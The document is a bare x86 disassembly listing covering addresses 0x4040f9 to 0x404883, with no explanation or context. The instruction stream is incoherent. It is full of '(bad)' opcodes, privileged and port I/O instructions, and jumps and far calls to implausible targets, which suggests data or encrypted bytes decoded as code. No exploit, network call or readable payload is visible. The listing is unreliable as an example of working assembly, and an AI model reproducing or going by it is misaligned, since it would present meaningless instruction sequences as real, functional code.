  4040f9:	ins    BYTE PTR es:[edi],dx
  4040fa:	int    0x35
  4040fc:	xor    bl,cl
  4040fe:	call   0x6d0b9dfb
  404103:	inc    DWORD PTR [eax]
  404105:	aad    0xb
  404107:	sbb    DWORD PTR [ebx],eax
  404109:	lea    edx,[eax-0x3a6a9440]
  40410f:	test   al,0xdf
  404111:	stos   DWORD PTR es:[edi],eax
  404112:	sub    BYTE PTR [ebp+0x57],cl
  404115:	jbe    0x404147
  404117:	xor    eax,edx
  404119:	lahf   
  40411a:	out    0xa,eax
  40411c:	dec    ebx
  40411d:	in     al,dx
  40411e:	jle    0x404157
  404120:	adc    bh,0x1e
  404123:	and    ebp,0xc4aae60a
  404129:	out    0xbe,eax
  40412b:	cld    
  40412c:	into   
  40412d:	pop    ds
  40412e:	pop    edi
  40412f:	sbb    BYTE PTR [edx],al
  404131:	fisubr WORD PTR [eax-0x1a]
  404134:	sbb    eax,0x11870e70
  404139:	into   
  40413a:	pop    ss
  40413b:	stos   DWORD PTR es:[edi],eax
  40413c:	inc    ecx
  40413d:	sub    DWORD PTR [edx+0x238e28d6],ebp
  404143:	sbb    DWORD PTR [edx],ebp
  404145:	pop    ecx
  404146:	jbe    0x404193
  404148:	or     DWORD PTR [ecx],ecx
  40414a:	cdq    
  40414b:	sub    ecx,DWORD PTR ds:0xa5f3da18
  404151:	add    eax,0x21acdaac
  404156:	out    dx,al
  404157:	sbb    eax,DWORD PTR [ebp-0x7f]
  40415a:	mov    ebp,0x5aaab8c3
  40415f:	fidiv  WORD PTR [ebx+0x7]
  404162:	lock ja 0x404134
  404165:	scas   eax,DWORD PTR es:[edi]
  404166:	rcl    BYTE PTR [ecx+0x1d],0x6a
  40416a:	mov    WORD PTR [edi+0x49],?
  40416d:	add    eax,0x2d18e09a
  404172:	js     0x4041b7
  404174:	dec    ecx
  404175:	lds    edi,FWORD PTR [ebx-0x35]
  404178:	mov    esi,0x6aa369b0
  40417d:	pop    ds
  40417e:	or     bh,BYTE PTR [eax]
  404180:	jne    0x4041fc
  404182:	sahf   
  404183:	sbb    DWORD PTR [edx-0x5d],ebx
  404186:	ror    esp,0x18
  404189:	pusha  
  40418a:	in     eax,0xc6
  40418c:	stc    
  40418d:	(bad)  
  40418e:	lods   al,BYTE PTR ds:[esi]
  40418f:	or     al,0x16
  404191:	add    ecx,0xffffffeb
  404194:	test   DWORD PTR [esi+0x53c5cf36],esp
  40419a:	push   ebx
  40419b:	dec    ebx
  40419c:	cmp    DWORD PTR [ebp-0x4f],edx
  40419f:	push   esp
  4041a0:	inc    edx
  4041a1:	test   BYTE PTR gs:[ecx-0x23],dh
  4041a5:	sub    BYTE PTR [esi+0xd],ch
  4041a8:	sbb    DWORD PTR [ebp+edx*8-0x64],esp
  4041ac:	add    eax,ebp
  4041ae:	push   ds
  4041af:	mov    al,0x86
  4041b1:	rcl    BYTE PTR [eax],cl
  4041b3:	popf   
  4041b4:	popf   
  4041b5:	jb     0x404155
  4041b7:	or     al,BYTE PTR [edi+ecx*2-0x35]
  4041bb:	aaa    
  4041bc:	mov    al,0xe5
  4041be:	dec    ecx
  4041bf:	sub    eax,0xf9673a26
  4041c4:	push   ebx
  4041c5:	and    al,0x4c
  4041c7:	and    DWORD PTR [edx+ebx*4-0x6a],esp
  4041cb:	cwde   
  4041cc:	pop    edi
  4041cd:	pop    esp
  4041ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041cf:	pop    edi
  4041d0:	mov    dl,0xcd
  4041d2:	rol    DWORD PTR [ecx],cl
  4041d4:	loopne 0x40420c
  4041d6:	add    al,0x37
  4041d8:	into   
  4041d9:	pop    ebp
  4041da:	jge    0x40421a
  4041dc:	pop    ebx
  4041dd:	xor    eax,0x39f0b1e3
  4041e2:	jmp    0x40424d
  4041e4:	xchg   esi,eax
  4041e5:	ret    0x45ec
  4041e8:	push   es
  4041e9:	fdivr  DWORD PTR [eax-0x70]
  4041ec:	into   
  4041ed:	(bad)  
  4041ee:	ror    BYTE PTR [ebx],0x4
  4041f1:	push   es
  4041f2:	and    ah,ch
  4041f4:	jg     0x404270
  4041f6:	xor    al,0xd4
  4041f8:	or     DWORD PTR [ecx],ebx
  4041fa:	shl    DWORD PTR [ebx],1
  4041fc:	sti    
  4041fd:	out    0x23,al
  4041ff:	jge    0x4041a3
  404201:	jno    0x404202
  404203:	cdq    
  404204:	push   esp
  404205:	cmp    ebp,DWORD PTR [eax+edx*4]
  404208:	je     0x40424f
  40420a:	stos   DWORD PTR es:[edi],eax
  40420b:	xchg   bh,bh
  40420d:	xchg   ebx,eax
  40420e:	pop    esp
  40420f:	outs   dx,DWORD PTR ds:[esi]
  404210:	sbb    al,dh
  404212:	cmp    edx,ebx
  404214:	nop
  404215:	repnz mov eax,0x223f9f3f
  40421b:	jno    0x4041a5
  40421d:	adc    eax,0x3fabe8c7
  404222:	push   esi
  404223:	mov    BYTE PTR [ebx-0x4fc305a9],dl
  404229:	retf   
  40422a:	je     0x40420b
  40422c:	icebp  
  40422d:	adc    eax,0xcab84417
  404232:	les    ebx,FWORD PTR [ebx-0x58]
  404235:	add    al,0xd5
  404237:	nop
  404238:	(bad)  ds:[edx+esi*2-0x673296a2]
  404240:	pop    ds
  404241:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404242:	js     0x40422e
  404244:	fsubr  DWORD PTR [edx-0x349d12ff]
  40424a:	jecxz  0x4041f3
  40424c:	lahf   
  40424d:	push   cs
  40424e:	inc    esi
  40424f:	jno    0x40424d
  404251:	fstp   TBYTE PTR [edi]
  404253:	mov    eax,DWORD PTR [eax-0x8]
  404256:	sub    DWORD PTR ds:0x3ebb066c,ebp
  40425c:	xor    DWORD PTR [eax],ebx
  40425e:	jnp    0x404282
  404260:	loope  0x404237
  404262:	pop    ecx
  404263:	sbb    DWORD PTR [edi-0x2a0b6817],edx
  404269:	and    BYTE PTR [eax+0x64],0x8d
  40426d:	adc    eax,0x8620e2ab
  404272:	dec    ecx
  404273:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404274:	loop   0x404270
  404276:	or     bh,bh
  404278:	jb     0x404275
  40427a:	dec    ecx
  40427b:	leave  
  40427c:	add    DWORD PTR [esi+0x8],edx
  40427f:	mov    dl,0x7e
  404281:	enter  0xf4ad,0x6e
  404285:	dec    ebp
  404286:	push   ss
  404287:	mov    bh,0x8c
  404289:	mov    bh,0xeb
  40428b:	push   esp
  40428c:	dec    esi
  40428d:	mov    ah,BYTE PTR [esi+esi*8-0x5a9880be]
  404294:	push   ss
  404295:	jae    0x404241
  404297:	iretw  
  404299:	mov    ah,0x16
  40429b:	xor    ecx,0x6e9955a5
  4042a1:	add    bl,BYTE PTR [edx]
  4042a3:	sbb    al,ah
  4042a5:	fstp   st(6)
  4042a7:	push   0x1c156de7
  4042ac:	fs mov eax,0xc7766f44
  4042b2:	push   ds
  4042b3:	icebp  
  4042b4:	mov    ch,0x75
  4042b6:	std    
  4042b7:	mov    ds:0xd0010342,al
  4042bc:	adc    ebp,0xffffffd6
  4042bf:	pop    edi
  4042c0:	xor    DWORD PTR [edx+0x409c9176],ebx
  4042c6:	fmul   QWORD PTR ds:[eax]
  4042c9:	push   esi
  4042ca:	in     al,0xff
  4042cc:	inc    ebx
  4042cd:	pop    ebp
  4042ce:	sbb    eax,0xb603d841
  4042d3:	aas    
  4042d4:	fsub   QWORD PTR [edx-0x48]
  4042d7:	(bad)  
  4042d9:	sub    DWORD PTR [edx-0x43a0ee8f],edi
  4042df:	push   ebp
  4042e0:	pop    ebx
  4042e1:	jno    0x40435f
  4042e3:	fcomip st,st(1)
  4042e5:	adc    BYTE PTR [edx+0x1a3972c4],bh
  4042eb:	mov    ah,0x76
  4042ed:	cmp    ecx,DWORD PTR [ecx+edi*8-0x65e22526]
  4042f4:	and    eax,0x4ade2048
  4042f9:	mov    WORD PTR [ecx],?
  4042fb:	sbb    al,0x85
  4042fd:	xchg   esp,eax
  4042fe:	and    ch,BYTE PTR [ebx]
  404300:	mov    edx,0x66784ee9
  404305:	jmp    FWORD PTR [edx]
  404307:	mov    WORD PTR [edi+0x6593afb1],es
  40430d:	sub    cl,dh
  40430f:	push   esp
  404310:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  404312:	jb     0x40438b
  404314:	ins    BYTE PTR es:[edi],dx
  404315:	jno    0x40430d
  404317:	mov    bl,0x87
  404319:	mov    esi,0xa8f1f718
  40431e:	push   esp
  40431f:	loop   0x404319
  404321:	or     ah,BYTE PTR ds:0xec7809c3
  404327:	cmp    al,0xb9
  404329:	xor    al,0x4a
  40432b:	inc    eax
  40432c:	jle    0x4043aa
  40432e:	mov    edx,0x3ce67e5a
  404333:	pop    eax
  404334:	xchg   esp,eax
  404335:	xor    DWORD PTR [edx-0x405a111c],esp
  40433b:	(bad)  
  40433c:	mov    esp,0x272dabe3
  404341:	loop   0x404378
  404343:	xchg   esp,eax
  404344:	dec    ecx
  404345:	loop   0x404346
  404347:	(bad)  
  404348:	lea    eax,[ebx+ebp*8]
  40434b:	mov    dh,0xf
  40434d:	popa   
  40434e:	jb     0x40439f
  404350:	jle    0x40431f
  404352:	or     eax,0xebe2be0a
  404357:	int    0xcc
  404359:	scas   eax,DWORD PTR es:[edi]
  40435a:	bound  edx,QWORD PTR [ebp-0x2d]
  40435d:	outs   dx,BYTE PTR ds:[esi]
  40435e:	jae    0x4042f2
  404360:	xor    eax,0x3de14bea
  404365:	add    al,BYTE PTR [ecx+0x5d]
  404368:	jbe    0x40435b
  40436a:	mov    cl,BYTE PTR [ecx-0x19]
  40436d:	daa    
  40436e:	sub    al,0x32
  404370:	cli    
  404371:	or     eax,0x700d1e5b
  404376:	dec    ecx
  404377:	pop    edi
  404378:	leave  
  404379:	sbb    al,0x93
  40437b:	or     ebp,edi
  40437d:	sub    BYTE PTR ds:0xac661a8,0x5f
  404384:	jp     0x404382
  404386:	shl    dl,1
  404388:	sbb    ah,bl
  40438a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40438b:	or     BYTE PTR [eax],al
  40438d:	jp     0x40435e
  40438f:	jle    0x4043be
  404391:	inc    edx
  404392:	sub    esi,esp
  404394:	adc    WORD PTR [edx],si
  404397:	dec    esi
  404398:	test   DWORD PTR [ecx+0x5532e6b9],edx
  40439e:	and    al,BYTE PTR [ebx]
  4043a0:	add    DWORD PTR [ebx+0x21],ebx
  4043a3:	xor    ecx,eax
  4043a5:	push   ss
  4043a6:	pop    eax
  4043a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043a8:	add    esi,0x2900fcc9
  4043ae:	pop    ds
  4043af:	rcl    DWORD PTR [ecx+0xe],cl
  4043b2:	jne    0x404423
  4043b4:	scas   al,BYTE PTR es:[edi]
  4043b5:	push   ecx
  4043b7:	jecxz  0x404412
  4043b9:	repz (bad) 
  4043bb:	outs   dx,DWORD PTR ds:[esi]
  4043bc:	push   ds
  4043bd:	and    al,0xfb
  4043bf:	pop    edi
  4043c0:	mov    al,ds:0xffc0729f
  4043c5:	jne    0x40441b
  4043c7:	daa    
  4043c8:	fucomp st(5)
  4043ca:	mov    cl,0x22
  4043cc:	sub    eax,0xd6be5a7
  4043d1:	loopne 0x4043d3
  4043d3:	aas    
  4043d4:	jle    0x404420
  4043d6:	popf   
  4043d7:	out    dx,eax
  4043d8:	les    edi,FWORD PTR [ebp-0x50]
  4043db:	pop    ss
  4043dc:	mov    eax,0x918bf86
  4043e1:	inc    esp
  4043e2:	scas   al,BYTE PTR es:[edi]
  4043e3:	dec    esi
  4043e4:	xchg   BYTE PTR [ebp+0x28],bl
  4043e7:	sub    esi,ebp
  4043e9:	je     0x4043fa
  4043eb:	mov    dh,0x1f
  4043ed:	les    esi,FWORD PTR [esi]
  4043ef:	adc    esi,ecx
  4043f1:	(bad)  
  4043f2:	pop    ebp
  4043f3:	hlt    
  4043f4:	shr    dl,0x67
  4043f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043f8:	lods   eax,DWORD PTR ds:[esi]
  4043f9:	(bad)  
  4043fa:	icebp  
  4043fb:	dec    edx
  4043fc:	repz xor dh,ch
  4043ff:	jae    0x404432
  404401:	pushf  
  404402:	push   eax
  404403:	inc    edx
  404404:	push   es
  404405:	fxch   st(7)
  404407:	inc    esi
  404408:	push   esp
  404409:	mov    bl,dl
  40440b:	pop    ebx
  40440c:	bound  eax,QWORD PTR [ebp-0x3c]
  40440f:	mov    bh,0xab
  404411:	mov    dh,0x5b
  404413:	xchg   ebp,eax
  404414:	adc    ah,bh
  404416:	lods   eax,DWORD PTR ds:[esi]
  404417:	add    eax,0xcf21428f
  40441c:	add    BYTE PTR [ebp-0x53a8c945],dh
  404422:	sti    
  404423:	es jne 0x40446b
  404426:	xchg   DWORD PTR [edx],ecx
  404428:	mov    ch,0xe6
  40442a:	jns    0x4043b6
  40442c:	pop    ecx
  40442d:	sbb    al,0x8f
  40442f:	xchg   ebx,eax
  404430:	mov    al,0xa3
  404432:	cld    
  404433:	or     dl,BYTE PTR [ebx]
  404435:	jl     0x404448
  404437:	repnz push DWORD PTR [ebx-0x19967761]
  40443e:	mov    ebp,0xb9c34aef
  404443:	js     0x40449e
  404445:	aas    
  404446:	mov    bh,0xe3
  404448:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404449:	sbb    al,BYTE PTR [edx-0x714a3d57]
  40444f:	dec    edi
  404450:	jle    0x404408
  404452:	sti    
  404453:	dec    esi
  404454:	out    dx,eax
  404455:	or     BYTE PTR [ebx],dh
  404457:	sub    al,0x12
  404459:	xchg   esp,eax
  40445a:	ret    0x9f0c
  40445d:	and    BYTE PTR [ebx],0x77
  404460:	test   BYTE PTR [ebp+0x5e6ad232],cl
  404466:	in     al,0xdb
  404468:	icebp  
  404469:	addr16 sub esp,0x319c119a
  404470:	rol    BYTE PTR [ecx-0x36],cl
  404473:	scas   al,BYTE PTR es:[edi]
  404474:	xor    BYTE PTR [eax-0x31],bh
  404477:	lock test DWORD PTR [esi+0x3f],0x611bf0ed
  40447f:	pop    ds
  404480:	sub    dl,BYTE PTR [edi-0x219e1494]
  404486:	jmp    0xab393899
  40448b:	test   BYTE PTR [esi+eiz*8-0x7a],bl
  40448f:	cld    
  404490:	lods   eax,DWORD PTR ds:[esi]
  404491:	ret    0xa82a
  404494:	and    BYTE PTR [ecx-0x6845f3fd],bl
  40449a:	lods   al,BYTE PTR ds:[esi]
  40449b:	mov    ch,0x57
  40449d:	push   ds
  40449e:	icebp  
  40449f:	push   eax
  4044a0:	xchg   edi,eax
  4044a1:	pop    eax
  4044a2:	sbb    eax,0xb92d8500
  4044a7:	test   al,dh
  4044a9:	popf   
  4044aa:	push   eax
  4044ab:	ds fcomp st(4)
  4044ae:	ret    0x3225
  4044b1:	shl    BYTE PTR [edi],cl
  4044b3:	dec    edi
  4044b4:	adc    BYTE PTR [edi+0x1b],bl
  4044b7:	adc    BYTE PTR [ecx+0x4954fda3],ch
  4044bd:	dec    ecx
  4044be:	mov    ecx,0x9ebcc350
  4044c3:	jno    0x404539
  4044c5:	xor    BYTE PTR [esi-0x71],bh
  4044c8:	push   edx
  4044c9:	push   esp
  4044ca:	jb     0x4044ef
  4044cc:	test   BYTE PTR [edx+edi*2+0x31],dl
  4044d0:	push   ecx
  4044d1:	imul   ebp,DWORD PTR ds:0x72953b9f,0x7021ed74
  4044db:	sub    al,0xa7
  4044dd:	shl    DWORD PTR [ecx-0x75],1
  4044e0:	inc    ecx
  4044e1:	sbb    BYTE PTR [ebp-0x4a6272d4],bl
  4044e7:	xor    esp,DWORD PTR [edi+0x17]
  4044ea:	gs (bad) 
  4044ed:	push   ds
  4044ee:	mov    BYTE PTR [ebx+ecx*1+0x1612d727],dl
  4044f5:	pop    ss
  4044f6:	cmp    eax,DWORD PTR [bx-0x4b]
  4044fa:	out    dx,eax
  4044fb:	mov    cl,0x1a
  4044fd:	dec    edi
  4044fe:	in     eax,dx
  4044ff:	cmp    bh,BYTE PTR [edi+0x2]
  404502:	dec    ecx
  404503:	jle    0x4044fe
  404505:	xchg   edx,eax
  404506:	add    BYTE PTR [ebx+ebx*2+0x53],cl
  40450a:	sub    eax,0x147e21fd
  40450f:	dec    eax
  404510:	ins    BYTE PTR es:[edi],dx
  404511:	icebp  
  404512:	das    
  404513:	(bad)  
  404514:	ret    0xdcee
  404517:	in     al,dx
  404518:	cs mov ch,0xa3
  40451b:	(bad)  
  40451c:	xchg   edi,eax
  40451d:	(bad)  
  40451e:	fnstsw WORD PTR [edi+0x60]
  404521:	cld    
  404522:	(bad)  
  404523:	(bad)  
  404524:	scas   eax,DWORD PTR es:[edi]
  404525:	xor    DWORD PTR [esi],edi
  404527:	outs   dx,DWORD PTR ds:[esi]
  404528:	push   es
  404529:	out    0x87,al
  40452b:	dec    ebx
  40452c:	sub    BYTE PTR [eax],bh
  40452e:	dec    eax
  40452f:	sub    edx,DWORD PTR [ebp+0x9]
  404532:	cmp    eax,0x5446e2bf
  404537:	pusha  
  404538:	pop    edi
  404539:	mov    BYTE PTR [esi],0xc
  40453c:	mov    al,BYTE PTR [ebx]
  40453e:	jne    0x404524
  404540:	(bad)  
  404541:	mov    cl,BYTE PTR [esi+0x17]
  404544:	inc    esi
  404545:	lds    edi,FWORD PTR [ebp+0x7b]
  404548:	pushf  
  404549:	out    dx,eax
  40454a:	add    BYTE PTR [ebp+edi*1+0x65],ah
  40454e:	inc    ebx
  40454f:	jns    0x4045b3
  404551:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404552:	jns    0x4045af
  404554:	jae    0x404506
  404556:	ins    DWORD PTR es:[edi],dx
  404557:	jp     0x4045d5
  404559:	jg     0x4045d6
  40455b:	mov    ah,0xdd
  40455d:	in     eax,dx
  40455e:	cdq    
  40455f:	pop    es
  404560:	les    esp,FWORD PTR [edi+0x63a862f7]
  404566:	dec    BYTE PTR [eax]
  404568:	sbb    al,0x12
  40456a:	popf   
  40456b:	test   ebx,edi
  40456d:	in     al,0xfb
  40456f:	cs jo  0x4045ad
  404572:	fcomp  QWORD PTR [ebp+0x12]
  404575:	test   BYTE PTR [edi+0x7df65c17],0xb1
  40457c:	jle    0x4045c8
  40457e:	cmp    DWORD PTR [ecx-0xf581900],edx
  404584:	call   0xc929:0xf21a1e5
  40458b:	sub    ecx,ebx
  40458d:	test   BYTE PTR [ebx-0x23d34d03],bh
  404593:	outs   dx,DWORD PTR ds:[esi]
  404594:	fdivr  DWORD PTR [edx-0x641089cc]
  40459a:	mov    ds:0x5321235e,al
  40459f:	mov    esi,0x58158088
  4045a4:	(bad)  
  4045a5:	pop    ds
  4045a6:	cmp    al,0x79
  4045a8:	mov    eax,edi
  4045aa:	push   edx
  4045ab:	nop
  4045ac:	cmp    DWORD PTR [eax-0x27],esp
  4045af:	enter  0xb791,0xf9
  4045b3:	adc    dl,0x5e
  4045b6:	xchg   esp,eax
  4045b7:	xor    bh,BYTE PTR [esi-0x2bdd169e]
  4045bd:	xlat   BYTE PTR ds:[ebx]
  4045be:	xor    ch,BYTE PTR [eax+0x55f3eefc]
  4045c4:	out    dx,al
  4045c5:	sub    eax,0x36780ce0
  4045ca:	jmp    0x40463b
  4045cc:	mov    ecx,0xaf0ec0c9
  4045d1:	sbb    al,0x86
  4045d3:	mov    al,0x3
  4045d5:	mov    WORD PTR [edi+edx*1-0x1f778f1c],fs
  4045dc:	pop    eax
  4045dd:	lods   al,BYTE PTR ds:[esi]
  4045de:	jmp    0x47674473
  4045e3:	mov    edi,0x962bd4a
  4045e8:	daa    
  4045e9:	dec    edx
  4045ea:	cwde   
  4045eb:	xchg   esi,eax
  4045ec:	inc    DWORD PTR [edx]
  4045ee:	in     al,dx
  4045ef:	jbe    0x40457c
  4045f1:	adc    al,BYTE PTR [edx-0x69b6d1f5]
  4045f7:	jmp    0x40462e
  4045f9:	dec    eax
  4045fa:	fild   DWORD PTR [eax+eiz*4+0x5a]
  4045fe:	nop
  4045ff:	add    DWORD PTR [ecx-0x442a807b],eax
  404605:	jmp    0x6efd:0xea92cdde
  40460c:	loop   0x404646
  40460e:	add    dl,al
  404610:	xor    dl,BYTE PTR [ebx-0x7bfb7460]
  404616:	inc    eax
  404617:	ins    DWORD PTR es:[edi],dx
  404618:	shl    BYTE PTR [eax-0x46],1
  40461b:	fstp   QWORD PTR [esi+0x61]
  40461e:	xchg   ebx,eax
  40461f:	xchg   DWORD PTR [ebp+0x5a6d0da7],edi
  404625:	scas   eax,DWORD PTR es:[edi]
  404626:	retf   
  404627:	sahf   
  404628:	sub    al,0x5a
  40462a:	sub    dl,dh
  40462c:	and    DWORD PTR [ecx-0x73],eax
  40462f:	jne    0x4045bf
  404631:	outs   dx,DWORD PTR ds:[esi]
  404632:	xchg   ebp,eax
  404633:	mov    ebp,0x4adc6cb
  404638:	add    DWORD PTR [edi-0x5160a38f],ebx
  40463e:	cmp    al,BYTE PTR [esi-0x4d]
  404641:	dec    esp
  404642:	jle    0x404656
  404644:	inc    edi
  404645:	cwde   
  404646:	sub    BYTE PTR [ebx],0xa8
  404649:	pop    ebx
  40464a:	ja     0x4046c6
  40464c:	push   ebp
  40464d:	gs aam 0x1f
  404650:	sbb    ebx,DWORD PTR [edi]
  404652:	inc    edx
  404653:	mov    esp,0xc190227e
  404658:	loop   0x4046d6
  40465a:	inc    esp
  40465b:	and    esi,ecx
  40465d:	retf   
  40465e:	icebp  
  40465f:	aam    0xae
  404661:	mov    bl,0xcd
  404663:	ds xchg ebp,eax
  404665:	pushf  
  404666:	cdq    
  404667:	jo     0x40464e
  404669:	aam    0x38
  40466b:	cmc    
  40466c:	mov    bh,0x50
  40466e:	xchg   edx,eax
  40466f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404670:	xor    DWORD PTR fs:[ecx+0x5b18ae88],ebp
  404677:	adc    eax,0xf6848ecf
  40467c:	sub    ebx,ebx
  40467e:	rcr    ecx,0xaf
  404681:	add    BYTE PTR [ebp-0x3f],ah
  404684:	and    cl,ch
  404686:	shl    DWORD PTR [edx],1
  404688:	imul   ebp,DWORD PTR [ecx-0x1be5051f],0x3
  40468f:	pop    ecx
  404690:	shl    BYTE PTR [edx],cl
  404692:	cwde   
  404693:	ss cli 
  404695:	ret    0xdb32
  404698:	xor    al,0xde
  40469a:	outs   dx,DWORD PTR ds:[esi]
  40469b:	inc    ebx
  40469c:	rcr    BYTE PTR [edi*4-0x3b8f0106],cl
  4046a3:	inc    ecx
  4046a4:	xor    al,0x57
  4046a6:	lahf   
  4046a7:	pop    edx
  4046a8:	adc    bl,dh
  4046aa:	jge    0x4046fc
  4046ac:	or     dh,0x7a
  4046af:	in     eax,dx
  4046b0:	or     ebp,esp
  4046b2:	pop    esi
  4046b3:	dec    eax
  4046b4:	sbb    eax,0x6cf0e06b
  4046b9:	mov    ebp,0x92430d0b
  4046be:	xchg   esp,eax
  4046bf:	jge    0x404683
  4046c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046c2:	ins    BYTE PTR es:[edi],dx
  4046c3:	sub    ecx,ebx
  4046c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046c6:	popa   
  4046c7:	shl    BYTE PTR [ebp+0x44e824a8],cl
  4046cd:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4046cf:	aam    0x3c
  4046d1:	popf   
  4046d2:	call   0x7777:0x29537d15
  4046d9:	out    0x0,eax
  4046db:	imul   esp,DWORD PTR [edi+eiz*1],0x7f
  4046df:	mov    ds:0x206d66c1,eax
  4046e4:	retf   
  4046e5:	dec    BYTE PTR ss:[edx]
  4046e8:	out    dx,al
  4046e9:	sbb    al,0xea
  4046eb:	out    dx,al
  4046ec:	in     al,0xc5
  4046ee:	dec    ebp
  4046ef:	addr16 dec ecx
  4046f1:	adc    al,0x19
  4046f3:	mov    dh,0xd
  4046f5:	xor    eax,0x52c29a2e
  4046fa:	loope  0x404722
  4046fc:	xor    ch,BYTE PTR [ebp+0x18]
  4046ff:	daa    
  404700:	or     eax,0x733ceb4
  404705:	lods   al,BYTE PTR ds:[esi]
  404706:	sbb    bl,BYTE PTR [esi]
  404708:	add    dh,BYTE PTR [ebx+0x5f346488]
  40470e:	or     DWORD PTR [edx-0x53582ec6],esp
  404714:	cvtpi2ps xmm1,mm1
  404717:	mov    al,ds:0xcb8d41ab
  40471c:	in     al,0x2f
  40471e:	and    cl,BYTE PTR [ecx-0x782d61dc]
  404724:	ficomp DWORD PTR [edi]
  404726:	cmp    al,0x20
  404728:	cwde   
  404729:	push   0xa22f8c77
  40472e:	inc    esi
  40472f:	rcl    DWORD PTR [edi],cl
  404731:	jecxz  0x404793
  404733:	pop    eax
  404734:	jmp    0x6c646e77
  404739:	fidivr WORD PTR [esp+esi*2+0x4a93d540]
  404740:	and    eax,0x673eb0b
  404745:	or     al,0x95
  404747:	xor    eax,0x7dbfcc61
  40474c:	dec    ebx
  40474d:	lock fiadd DWORD PTR [esi+0x4b125ae2]
  404754:	or     eax,0x88b29b3
  404759:	out    dx,eax
  40475a:	outs   dx,BYTE PTR ds:[esi]
  40475b:	(bad)  [esi+0x78]
  40475e:	dec    esp
  40475f:	ds fwait
  404761:	push   ds
  404762:	outs   dx,BYTE PTR ds:[esi]
  404763:	mov    ch,0xc0
  404765:	mov    ah,0xa3
  404767:	add    BYTE PTR [esi+0x3560fb70],al
  40476d:	push   ecx
  40476e:	fiadd  WORD PTR [edx+0xb]
  404771:	dec    eax
  404772:	mov    eax,0x7eea0198
  404777:	adc    eax,0x32e3e473
  40477c:	fsub   st(0),st
  40477e:	jg     0x40478a
  404780:	dec    esi
  404781:	or     DWORD PTR [edi-0x31],edx
  404784:	jecxz  0x404745
  404786:	add    DWORD PTR [edi+0x1b],edx
  404789:	sbb    edi,DWORD PTR [ecx]
  40478b:	or     DWORD PTR [esi-0x1625a451],edi
  404791:	popf   
  404792:	mov    ds:0x9230bdd5,al
  404797:	xchg   edx,eax
  404798:	fdivrp st(0),st
  40479a:	dec    esp
  40479b:	stc    
  40479c:	dec    esi
  40479d:	rcr    DWORD PTR [eax-0x7e5dfaf7],cl
  4047a3:	rcr    BYTE PTR [edx+ebx*4],1
  4047a6:	repnz (bad) 
  4047a9:	mov    WORD PTR [ebp+esi*8+0x703b6efc],cs
  4047b0:	or     DWORD PTR [edx-0x44a4ecdd],eax
  4047b6:	addr16 inc ecx
  4047b8:	loop   0x4047aa
  4047ba:	into   
  4047bb:	ror    BYTE PTR [ecx+0x4f],1
  4047be:	sbb    al,0x92
  4047c0:	mov    ?,WORD PTR ds:[edx+0x59218da6]
  4047c7:	pusha  
  4047c8:	pop    ds
  4047c9:	inc    edx
  4047ca:	cli    
  4047cb:	in     eax,0xde
  4047cd:	rcr    BYTE PTR [ebx-0x79504ce0],0xfc
  4047d4:	jmp    DWORD PTR [eax-0x42]
  4047d7:	jo     0x404788
  4047d9:	lods   eax,DWORD PTR ds:[esi]
  4047da:	dec    esi
  4047db:	xor    DWORD PTR [ebx],0x65b360c6
  4047e1:	daa    
  4047e2:	adc    DWORD PTR [esi],ebp
  4047e4:	jle    0x4047e3
  4047e6:	jb     0x4047b9
  4047e8:	sbb    al,0xaa
  4047ea:	dec    ebp
  4047eb:	xor    al,0x62
  4047ed:	cmp    BYTE PTR [edi],bh
  4047ef:	mov    eax,0x3606d4f3
  4047f4:	jp     0x404817
  4047f6:	xor    eax,0x4553d68d
  4047fb:	lods   eax,DWORD PTR ds:[esi]
  4047fc:	(bad)  
  4047fd:	push   ss
  4047fe:	push   ss
  4047ff:	out    dx,eax
  404800:	(bad)  [edi]
  404802:	pop    esp
  404803:	push   es
  404804:	pop    ebp
  404805:	out    0xcf,eax
  404807:	aam    0xf9
  404809:	lds    ebp,FWORD PTR [esi+0x1e]
  40480c:	sbb    ch,BYTE PTR [eax+0x73]
  40480f:	arpl   WORD PTR [edi-0x67],si
  404812:	inc    esi
  404813:	wrmsr  
  404815:	fs cmp eax,0x372dfce2
  40481b:	lahf   
  40481c:	inc    eax
  40481d:	mov    eax,ds:0xd13e81db
  404822:	or     al,0x59
  404824:	retf   
  404825:	jno    0x4047e5
  404827:	mov    eax,ds:0xe4f37846
  40482c:	popa   
  40482d:	mov    ds:0x7809067b,eax
  404832:	ja     0x404823
  404834:	call   ebx
  404836:	cmp    edx,DWORD PTR fs:[eax]
  404839:	leave  
  40483a:	and    ch,BYTE PTR [edx+0x1ea6cfe8]
  404840:	mov    ecx,0xd0b1630
  404845:	xchg   ecx,eax
  404846:	fimul  WORD PTR [esp+eax*1-0x5f8bde74]
  40484d:	jmp    0x4047db
  40484f:	jnp    0x404830
  404851:	mov    ebp,0xf5ea06a
  404856:	mov    eax,DWORD PTR [eax]
  404858:	lods   eax,DWORD PTR ds:[esi]
  404859:	lods   eax,DWORD PTR ds:[esi]
  40485a:	inc    edx
  40485b:	push   ebp
  40485c:	sti    
  40485d:	cdq    
  40485e:	jecxz  0x404856
  404860:	aad    0xe5
  404862:	ins    DWORD PTR es:[edi],dx
  404863:	inc    ecx
  404864:	sub    edx,DWORD PTR [eax-0x7d]
  404867:	push   edx
  404868:	mov    esi,0x15cf0ece
  40486d:	push   ss
  40486e:	shl    dh,cl
  404870:	inc    esp
  404871:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404872:	xlat   BYTE PTR ds:[ebx]
  404873:	or     al,0xd4
  404875:	mov    al,0xac
  404877:	enter  0xd33e,0x3d
  40487b:	adc    edx,DWORD PTR [ebx-0x72a7feec]
  404881:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404882:	(bad)  
  404883:	jg     0x4048e8
